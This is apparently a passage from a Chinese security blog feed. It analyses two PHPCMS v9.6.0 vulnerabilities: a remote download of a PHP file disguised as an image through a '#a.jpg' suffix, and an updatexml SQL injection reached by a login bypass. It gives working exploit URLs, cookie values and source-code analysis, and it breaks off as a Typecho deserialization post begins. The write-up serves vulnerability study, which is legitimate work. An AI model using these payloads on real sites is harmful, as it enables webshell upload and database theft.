<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">	 * &#x9644;&#x4EF6;&#x4E0B;&#x8F7D;</span></span><br><span class="line"><span class="hljs-comment">	 * Enter description here ...</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $field &#x9884;&#x7559;&#x5B57;&#x6BB5;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $value &#x4F20;&#x5165;&#x4E0B;&#x8F7D;&#x5185;&#x5BB9;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $watermark &#x662F;&#x5426;&#x52A0;&#x5165;&#x6C34;&#x5370;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $ext &#x4E0B;&#x8F7D;&#x6269;&#x5C55;&#x540D;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $absurl &#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $basehref </span></span><br><span class="line"><span class="hljs-comment">	 */</span></span><br><span class="line">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span><span class="hljs-params">($field, $value,$watermark = <span class="hljs-string">&apos;0&apos;</span>,$ext = <span class="hljs-string">&apos;gif|jpg|jpeg|bmp|png&apos;</span>, $absurl = <span class="hljs-string">&apos;&apos;</span>, $basehref = <span class="hljs-string">&apos;&apos;</span>)</span></span></span><br><span class="line"><span class="hljs-function">	</span>{</span><br><span class="line">		<span class="hljs-keyword">global</span> $image_d;</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="hljs-string">&apos;attachment_model&apos;</span>);</span><br><span class="line">		$upload_url = pc_base::load_config(<span class="hljs-string">&apos;system&apos;</span>,<span class="hljs-string">&apos;upload_url&apos;</span>);</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;field = $field;</span><br><span class="line">		$dir = date(<span class="hljs-string">&apos;Y/md/&apos;</span>);</span><br><span class="line">		$uploadpath = $upload_url.$dir;</span><br><span class="line">		$uploaddir = <span class="hljs-keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">		$string = new_stripslashes($value);</span><br><span class="line">		<span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;</span>, $string, $matches)) <span class="hljs-keyword">return</span> $value;</span><br><span class="line">		$remotefileurls = <span class="hljs-keyword">array</span>();</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($matches[<span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> $matche)</span><br><span class="line">		{</span><br><span class="line">			<span class="hljs-keyword">if</span>(strpos($matche, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-keyword">false</span>) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="hljs-keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		}</span><br><span class="line">		<span class="hljs-keyword">unset</span>($matches, $string);</span><br><span class="line">		$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">		$oldpath = $newpath = <span class="hljs-keyword">array</span>();</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($remotefileurls <span class="hljs-keyword">as</span> $k=&gt;$file) {</span><br><span class="line">			<span class="hljs-keyword">if</span>(strpos($file, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-keyword">false</span> || strpos($file, $upload_url) !== <span class="hljs-keyword">false</span>) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			$filename = fileext($file);</span><br><span class="line">			$file_name = basename($file);</span><br><span class="line">			$filename = <span class="hljs-keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">			$newfile = $uploaddir.$filename;</span><br><span class="line">			$upload_func = <span class="hljs-keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="hljs-keyword">if</span>($upload_func($file, $newfile)) {</span><br><span class="line">				$oldpath[] = $k;</span><br><span class="line">				$GLOBALS[<span class="hljs-string">&apos;downloadfiles&apos;</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">				@chmod($newfile, <span class="hljs-number">0777</span>);</span><br><span class="line">				$fileext = fileext($filename);</span><br><span class="line">				<span class="hljs-keyword">if</span>($watermark){</span><br><span class="line">					watermark($newfile, $newfile,<span class="hljs-keyword">$this</span>-&gt;siteid);</span><br><span class="line">				}</span><br><span class="line">				$filepath = $dir.$filename;</span><br><span class="line">				$downloadedfile = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;filename&apos;</span>=&gt;$filename, <span class="hljs-string">&apos;filepath&apos;</span>=&gt;$filepath, <span class="hljs-string">&apos;filesize&apos;</span>=&gt;filesize($newfile), <span class="hljs-string">&apos;fileext&apos;</span>=&gt;$fileext);</span><br><span class="line">				$aid = <span class="hljs-keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">				<span class="hljs-keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="hljs-keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x9996;&#x5148;&#x9650;&#x5236;&#x4E86;&#x5176;&#x4E2D; <code>$ext</code> &#x53EA;&#x5141;&#x8BB8;&#x4E3A;<code>gif|jpg|jpeg|bmp|png</code> </p>
<p>153&#x884C; &#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x8FC7;&#x6EE4;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;</span>, $string, $matches)) <span class="hljs-keyword">return</span> $value;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x91CC;&#x5339;&#x914D;&#x4E86;<code>src</code>&#x6216;<code>href</code>&#x4E2D;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4E0D;&#x8FC7;&#x540E;&#x7F00;&#x4E3A;<code>$ext</code>&#xFF0C;&#x5176;&#x4E2D;<code>$ext</code>&#x7684;&#x503C;&#x4E3A;&#xFF1A;<code>gif|jpg|jpeg|bmp|png</code></p>
<p><code>http://ip/p2hm1n.php#a.jpg</code> &#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x6B63;&#x5219;</p>
<p>158&#x884C; &#x4F7F;&#x7528;&#x4E86; <code>fillurl</code> &#x51FD;&#x6570;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#x8D44;&#x6E90;&#xFF0C;&#x8FD8;&#x5427; # &#x4E4B;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x5168;&#x90E8;&#x79FB;&#x9664;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="hljs-string">&apos;#&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>($pos&gt;<span class="hljs-number">0</span>) $surl = substr($surl,<span class="hljs-number">0</span>,$pos);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>P2hm1n.php#a.jpg</code> &#x4F1A;&#x88AB;&#x5904;&#x7406;&#x6210; <code>P2hm1n.php</code></p>
<p>&#x4E4B;&#x540E;&#x8C03;&#x7528; <code>download</code> &#x65B9;&#x6CD5;&#x3002;&#x7A0B;&#x5E8F;&#x76F4;&#x63A5;&#x8C03;&#x7528; <code>copy</code> &#x51FD;&#x6570;&#x5C06;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x672C;&#x5730;</p>
<h2 id="wap&#x6A21;&#x5757;-SQL&#x6CE8;&#x5165;"><a href="#wap&#x6A21;&#x5757;-SQL&#x6CE8;&#x5165;" class="headerlink" title="wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;"></a>wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;</h2><h3 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-1"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h3><p>&#x8BBF;&#x95EE; <code>http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1</code></p>
<blockquote>
<p>PS: &#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x662F;&#x4E0D;&#x5177;&#x5907;war&#x6A21;&#x5757;&#x7684;&#xFF0C;&#x8DDF;&#x8FDB;&#x540E;&#x53F0;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x597D;&#x50CF;&#x8DDF;&#x624B;&#x673A;&#x95E8;&#x6237;&#x7F51;&#x7AD9;&#x6709;&#x5173;&#xFF0C;&#x4F46;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x5F71;&#x54CD;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;</p>
</blockquote>
<p>&#x76F4;&#x63A5;&#x53D1;&#x5305;&#x81F3; repeater &#x6A21;&#x5757;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/qFr95yWlGcEsjZM-20201117115108047.jpg" alt></p>
<p>&#x5C06;&#x8FD4;&#x56DE;&#x7684; <code>Set-Cookie</code> &#x4E2D;<code>TVAUD_siteid</code>&#x503C;&#x9644;&#x503C;&#x7ED9; <code>userid_flash</code>&#x53D8;&#x91CF;<br>&#x56E0;&#x6B64; <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code></p>
<p>&#x8BBF;&#x95EE; </p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5E76; POST &#x4F20;&#x53C2; <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VSoJDEBZkU7Fsw8-20201117115108185.jpg" alt></p>
<p>&#x5C06;&#x8FD4;&#x56DE;&#x7684; <code>Set-Cookie</code> &#x4E2D;<code>TVAUD_att_json</code>&#x503C;&#x9644;&#x503C;&#x7ED9; <code>a_k</code>&#x53C2;&#x6570;</p>
<p>GET&#x578B;&#x8BBF;&#x95EE; </p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3fuanq7rCEoSyOZ-20201117115108205.jpg" alt></p>
<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;-1"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3><p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>phpcms/modules/content/down.php</code> &#x7684; <code>init()</code> &#x51FD;&#x6570;<br>12 &#x884C; GET&#x65B9;&#x5F0F;&#x4F20;&#x5165; <code>a_k</code>&#x53C2;&#x6570;<br>14 &#x884C; &#x6839;&#x636E; <code>DECODE</code> &#x5224;&#x65AD;&#x5176; <code>sys_auth</code> &#x4E3A;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x51FD;&#x6570;&#x3002;&#x76F4;&#x63A5;&#x8BC1;&#x660E;&#x2014;&#x2014;&#x300B;<code>a_k</code>&#x53C2;&#x6570;&#x4E4B;&#x524D;&#x662F;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x5176;&#x5B9E;&#x5F88;&#x957F;&#xFF0C;&#x6211;&#x4EEC;&#x5176;&#x5B9E;&#x4E0D;&#x7528;&#x53BB;&#x770B;&#x5B83;&#x7684;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;<br>17 &#x884C; &#x4F7F;&#x7528; <code>parse_str()</code> &#x51FD;&#x6570;&#x5904;&#x7406; &#x3002;  <code>parse_str()</code> &#x51FD;&#x6570;&#x4F1A;&#x81EA;&#x52A8;&#x5BF9;&#x4F20;&#x5165;&#x7684;&#x503C;&#x5C06;&#x5176;&#x6839;&#x636E;<code>&amp;</code>&#x5206;&#x5272;&#xFF0C;&#x7136;&#x540E;&#x89E3;&#x6790;&#x5230;&#x5177;&#x4F53;&#x53D8;&#x91CF;&#x5E76;&#x6CE8;&#x518C;&#x53D8;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5185;&#x5BB9;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Y36mPkxv12pZhlM-20201117115108098.jpg" alt><br>26 &#x884C; &#x5F15;&#x7528;&#x672A;&#x6CE8;&#x518C;&#x53D8;&#x91CF; <code>array(&#x2018;id&#x2019;=&gt;$id)</code> &#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x7684;<code>id</code>&#x53EF;&#x4EE5;&#x4ECE;<code>parse_str</code>&#x51FD;&#x6570;&#x5904;&#x7406;<code>$a_k</code>&#x540E;&#x5F97;&#x5230;&#x3002;&#x4E14;&#x8C03;&#x7528; <code>get_one</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p><code>get_one</code>&#x65B9;&#x6CD5;&#x5B9A;&#x4E49;&#x70B9;&#x5728;  <code>/phpcms/libs/classes/model.class.php</code> 73-76&#x884C;&#x3002;&#x8DDF;&#x8FDB;&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x7684; <code>get_one</code> &#x65B9;&#x6CD5;&#x5176;&#x5B9E;&#x5C31;&#x662F; SQL &#x67E5;&#x8BE2;&#x3002;&#x4E14;&#x7528;&#x5230;&#x4E86; <code>sqls</code> &#x65B9;&#x6CD5;&#x3002;<br>&#x8DDF;&#x8FDB; <code>sqls</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5BF9;&#x6570;&#x7EC4;&#x53C2;&#x6570;&#x7684;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VzLkrIoPJFl15Di-20201117115108399.jpg" alt><br>&#x4E14;&#x4ECE;&#x5934;&#x5230;&#x4F4D;&#x90FD;&#x6CA1;&#x6709;&#x5BF9;<code>$id</code> &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x5904;&#x7406;&#x3002;&#x56E0;&#x6B64;&#x5B58;&#x5728; sql &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</p>
<p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x6839;&#x636E; &#x4ECE;<code>parse_str</code>&#x51FD;&#x6570;&#x5904;&#x7406;<code>$a_k</code>&#x540E;&#x5F97;&#x5230;&#x7684; <code>id</code> &#x63A8;&#x65AD;&#x51FA;&#x4E86;&#x5B58;&#x5728; sql&#x6CE8;&#x5165;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x63A8;&#x65AD;&#x4E2D;&#x5FFD;&#x7565;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;&#x56E0;&#x6B64;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x627E;&#x5230;&#x5E26;&#x6709; sql&#x6CE8;&#x5165;payload &#x7ECF;&#x8FC7;&#x4E00;&#x6B21;&#x52A0;&#x5BC6;&#x4E4B;&#x540E;&#x7684; payload&#x3002;</p>
<p><strong>&#x6838;&#x5FC3;&#x76EE;&#x7684;&#xFF1A;&#x6784;&#x9020;&#x52A0;&#x5BC6;&#x540E;&#x7684; <code>$a_k</code> &#x53D8;&#x91CF;</strong></p>
<p><strong>&#x601D;&#x8DEF;&#x4E00;&#xFF1A;&#x4F2A;&#x9020;&#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;&#xFF1A;&#x76F4;&#x63A5;&#x5BF9;&#x5E94;&#x6E90;&#x7801;&#x4E2D;&#x52A0;&#x5BC6;&#x4EE3;&#x7801;&#xFF0C;&#x8FDB;&#x884C;&#x672C;&#x5730;&#x52A0;&#x89E3;&#x5BC6;&#x3002;</strong><br>&#x4EA7;&#x751F;&#x95EE;&#x9898;&#xFF1A;&#x6E90;&#x7801;&#x4E2D;&#x5BF9;&#x5E94;&#x7684; auth_key &#x503C;&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x3002;&#x4E14;&#x6BCF;&#x4E2A;&#x7AD9;&#x70B9;&#x8FD9;&#x4E2A; auth_key &#x53EF;&#x80FD;&#x4E0D;&#x4E00;&#x6837;&#x3002;</p>
<p><strong>&#x601D;&#x8DEF;&#x4E8C;&#xFF1A;&#x5BFB;&#x627E;&#x6E90;&#x7801;&#x4E2D;&#x8C03;&#x7528;&#x6B64;&#x52A0;&#x5BC6;&#x7684;&#x5730;&#x65B9;&#x3002;&#x4E14;&#x53EF;&#x56DE;&#x663E;&#x52A0;&#x5BC6;&#x540E;&#x4EE3;&#x7801;</strong><br>&#x65B9;&#x6CD5;&#xFF1A; &#x5168;&#x5C40;&#x641C;&#x7D22; sys_auth &#x3002;<br><code>phpcms\libs\classes\param.class.php</code> &#x4E2D;&#x5B58;&#x5728; <code>set_cookie</code> &#x65B9;&#x6CD5;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5BUeGSb2Oyzhqj4-20201117115108323.jpg" alt><br>&#x5BFB;&#x627E;&#x54EA;&#x91CC;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;sql&#x6CE8;&#x5165;&#x7684;&#x4F20;&#x5165;&#x70B9;&#x3002;&#x4E14;&#x53EF;&#x901A;&#x8FC7; cookie &#x52A0;&#x5BC6;&#x83B7;&#x5F97;&#x52A0;&#x5BC6;&#x540E; payload<br>&#x5173;&#x952E;&#x70B9;&#xFF1A;<code>phpcms/modules/attachment/attachments.php</code> &#x7684; <code>swfupload_json</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swfupload_json</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">	$arr[<span class="hljs-string">&apos;aid&apos;</span>] = intval($_GET[<span class="hljs-string">&apos;aid&apos;</span>]);</span><br><span class="line">	$arr[<span class="hljs-string">&apos;src&apos;</span>] = safe_replace(trim($_GET[<span class="hljs-string">&apos;src&apos;</span>]));</span><br><span class="line">	$arr[<span class="hljs-string">&apos;filename&apos;</span>] = urlencode(safe_replace($_GET[<span class="hljs-string">&apos;filename&apos;</span>]));</span><br><span class="line">	$json_str = json_encode($arr);</span><br><span class="line">	$att_arr_exist = param::get_cookie(<span class="hljs-string">&apos;att_json&apos;</span>);</span><br><span class="line">	$att_arr_exist_tmp = explode(<span class="hljs-string">&apos;||&apos;</span>, $att_arr_exist);</span><br><span class="line">	<span class="hljs-keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">	} <span class="hljs-keyword">else</span> {</span><br><span class="line">		$json_str = $att_arr_exist ? $att_arr_exist.<span class="hljs-string">&apos;||&apos;</span>.$json_str : $json_str;</span><br><span class="line">		param::set_cookie(<span class="hljs-string">&apos;att_json&apos;</span>,$json_str);</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;			</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x901A;&#x8FC7; GET &#x4F20;&#x5165;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570; <code>aid</code> &#x7ECF;&#x8FC7;&#x4E86; <code>intval</code> &#x51FD;&#x6570;&#x5904;&#x7406;&#xFF0C;&#x90A3;&#x4E48;&#x4E0D;&#x592A;&#x9002;&#x5408;&#x901A;&#x8FC7;&#x6B64;&#x5904;&#x4F20;&#x5165;payload&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570; <code>src</code> &#x7ECF;&#x8FC7;&#x4E86; <code>safe_replace</code>&#x5904;&#x7406;&#x3002;&#x7B2C;&#x4E09;&#x4E2A; <code>filename</code> &#x901A;&#x8FC7; <code>safe_replace</code> &#x548C; &#x4E00;&#x6B21;url &#x7F16;&#x7801;&#x5904;&#x7406;&#x3002;&#x4E4B;&#x540E;&#x505A; <code>json_encode</code> &#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6700;&#x7EC8;&#x518D;&#x8C03;&#x7528; <code>set_cookie</code> &#x65B9;&#x6CD5;&#x3002;<br>&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B; <code>safe_replace</code> &#x65B9;&#x6CD5;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x901A;&#x8FC7; <code>str_replace</code> &#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x4E14;&#x6CA1;&#x6709;&#x901A;&#x8FC7;&#x5FAA;&#x73AF;&#x904D;&#x5386;&#x6765;&#x8FC7;&#x6EE4;&#xFF0C;&#x5B83;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;&#x90A3;&#x4E48;&#x4E24;&#x4E24;&#x7EC4;&#x5408;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x66FF;&#x6362;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230; bypass &#x7684;&#x6548;&#x679C;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fdxGa6P3iTprsV2-20201117115108325.jpg" alt></p>
<p>&#x4F46;&#x662F;&#x5728;&#x89E6;&#x53D1;  <code>set_cookie</code> &#x7684; <code>swfupload_json</code> &#x65B9;&#x6CD5;&#xFF0C;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x6761;&#x4EF6;&#x3002;<br>&#x5728;<code>phpcms/modules/attachment/attachments.php</code>&#x7B2C;&#x5341;&#x884C;&#x7684; <code>attachments</code> &#x7C7B;&#x3002;&#x5176;&#x4E2D; <code>__construct</code> &#x65B9;&#x6CD5;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x505A;&#x7C7B;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5DE5;&#x4F5C;&#x3002;&#x5176;&#x4E2D;&#x6709;&#x7528;&#x6237;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x68C0;&#x6D4B;&#x3002;21&#x884C;&#x9650;&#x5236; <code>$this&#x2192;userid</code> &#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x8F6C;&#x5230;&#x767B;&#x5F55;&#x754C;&#x9762;<br>17 &#x884C; &#x7A0B;&#x5E8F;&#x5E76;&#x6CA1;&#x6709;&#x68C0;&#x67E5; <code>$this-&gt;userid</code> &#x7684;&#x6709;&#x6548;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x8981;&#x4F20;&#x5165;&#x7684; <code>userid_flash</code> &#x662F;&#x52A0;&#x5BC6;&#x503C;&#x5C31;&#x80FD;&#x591F;&#x89E3;&#x5BC6;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x68C0;&#x6D4B;&#x3002;<br>&#x83B7;&#x53D6; <code>userid_flash</code>&#x52A0;&#x5BC6;&#x503C;&#xFF1A;&#x5728;<code>phpcms/modules/wap/index.php</code> &#x6587;&#x4EF6;&#x3002;&#x901A;&#x8FC7; cookie &#x83B7;&#x53D6; <code>$_GET[&#x2018;siteid&#x2019;]</code> &#x52A0;&#x5BC6;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4F5C;&#x4E3A; <code>$_POST[&#x2018;userid_flash&#x2019;]</code> &#x7684;&#x503C;&#xFF0C;&#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x767B;&#x5F55;&#x68C0;&#x6D4B;&#x3002;</p>
<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
<blockquote>
<p><a href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a><br><a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a><br><a href="https://www.freebuf.com/articles/web/202914.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/202914.html</a><br><a href="http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/</a></p>
</blockquote>
</body></html>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>PHPCMS</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Typecho 反序列化漏洞分析</title>
    <url>/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>Typecho &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x548C;&#x4E00;&#x4E9B;&#x5751;&#x70B9;</p>
<a id="more"></a>

<h2 id="&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;"><a href="#&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;"></a>&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;</h2><blockquote>
<p>Typecho&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#xFF0C;&#x8F7B;&#x5DE7;&#x7684;&#x535A;&#x5BA2;&#x7A0B;&#x5E8F;&#x3002;&#x57FA;&#x4E8E;PHP&#xFF0C;&#x4F7F;&#x7528;&#x591A;&#x79CD;&#x6570;&#x636E;&#x5E93;&#xFF08;Mysql&#xFF0C;PostgreSQL&#xFF0C;SQLite&#xFF09;&#x50A8;&#x5B58;&#x6570;&#x636E;&#x3002;&#x5728;GPL Version 2&#x8BB8;&#x53EF;&#x8BC1;&#x4E0B;&#x53D1;&#x884C;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x76EE;&#x524D;&#x4F7F;&#x7528;SVN&#x6765;&#x505A;&#x7248;&#x672C;&#x7BA1;&#x7406;&#x3002;</p>
</blockquote>
